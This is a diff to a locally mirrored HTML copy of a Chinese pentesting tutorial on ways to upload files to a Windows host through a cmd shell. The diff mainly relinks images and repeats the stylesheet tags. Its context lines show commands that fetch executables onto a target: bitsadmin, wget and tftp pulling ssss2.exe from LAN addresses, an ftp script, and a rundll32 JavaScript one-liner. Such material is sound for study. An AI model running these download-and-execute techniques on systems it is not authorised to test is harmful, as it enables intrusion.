@@ -3,7 +3,7 @@
 			<head>
 			     <title>渗透技巧——通过cmd上传文件的N种方法 - 三好学生</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/14101">http://drops.wooyun.org/tips/14101</a></h1>
 				
@@ -14,7 +14,7 @@
 
 <p>在渗透测试的过程中，常常需要向目标主机上传文件，我在最近的学习测试过程中就碰到了这个问题，要求只能通过cmd shell向目标主机（Windows系统）上传文件，所以本文就对该技巧做一下总结。</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/2016033009121759442130.jpg" alt="Alt text"></p>
+<p><img src="../images_result/images/2016033009121759442130.jpg" alt="Alt text"></p>
 
 <!--more-->
 
@@ -48,7 +48,7 @@ test exe：ssss2.exe,成功运行后输出1
 
 <p>特别的是它还有一个功能可以将十六进制代码转换为可执行文件：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/2016033009121959579259.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016033009121959579259.png" alt="Alt text"></p>
 
 <p>结合本文的目标，思路如下：</p>
 
@@ -64,7 +64,7 @@ test exe：ssss2.exe,成功运行后输出1
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/2016033009122047403348.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016033009122047403348.png" alt="Alt text"></p>
 
 <p><strong>操作步骤：</strong></p>
 
@@ -81,14 +81,14 @@ wine exe2bat.exe ssss2.exe ssss2.txt
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/2016033009122225187425.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016033009122225187425.png" alt="Alt text"></p>
 
 <p><strong>注：</strong><br>
 exe2bat不支持大于64kb的文件 debug默认只支持在32位系统</p>
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/2016033009122314499520.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016033009122314499520.png" alt="Alt text"></p>
 
 <h3>2、ftp</h3>
 
@@ -113,7 +113,7 @@ ftp -s:ftp.txt
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/2016033009122511491620.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016033009122511491620.png" alt="Alt text"></p>
 
 <p><strong>注：</strong><br>
 初次使用ftp下载防火墙会弹框拦截，使用前记得要先添加防火墙规则</p>
@@ -197,7 +197,7 @@ t\update\download.exe C:\test\update\download.cs
 
 <p>如图成功生成download.exe</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/2016033009122671756720.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016033009122671756720.png" alt="Alt text"></p>
 
 <p><strong>注：</strong><br>
 csc.exe的绝对路径要根据系统的.net版本来确定</p>
@@ -235,9 +235,9 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();Object
 
 <p>执行后会提示没有权限，很有趣的地方，更多的细节会在以后的文章介绍</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/2016033009122885417818.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016033009122885417818.png" alt="Alt text"></p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/2016033009123078521918.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016033009123078521918.png" alt="Alt text"></p>
 
 <h3>7、hta</h3>
 
@@ -285,7 +285,7 @@ bitsadmin /transfer n http://download.sysinternals.com/files/PSTools.zip  C:\tes
 
 <p>下载成功如图：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/20160330091232111021017.png" alt="Alt text"></p>
+<p><img src="../images_result/images/20160330091232111021017.png" alt="Alt text"></p>
 
 <p><strong>注：</strong><br>
 不支持https、ftp协议<br>
@@ -341,7 +341,7 @@ namespace test1
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160407/2016040703495749038.png" alt="enter image description here"></p>
+<p><img src="../images_result/images/2016040703495749038.png" alt="enter image description here"></p>
 
 <p>解密base64文件并生成exe的方法：</p>
 
@@ -434,7 +434,7 @@ C:\test\update\wget\wget.exe http://192.168.174.145/ssss2.exe
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/20160330091233967151122.png" alt="Alt text"></p>
+<p><img src="../images_result/images/20160330091233967151122.png" alt="Alt text"></p>
 
 <h3>2、ftfp</h3>
 
@@ -457,7 +457,7 @@ tftp -i 192.168.174.151 GET tftp\ssss2.exe C:\test\update\ssss2.exe
 
 <p>如图</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/20160330091235612341219.png" alt="Alt text"></p>
+<p><img src="../images_result/images/20160330091235612341219.png" alt="Alt text"></p>
 
 <h1>0x05 小结</h1>
 
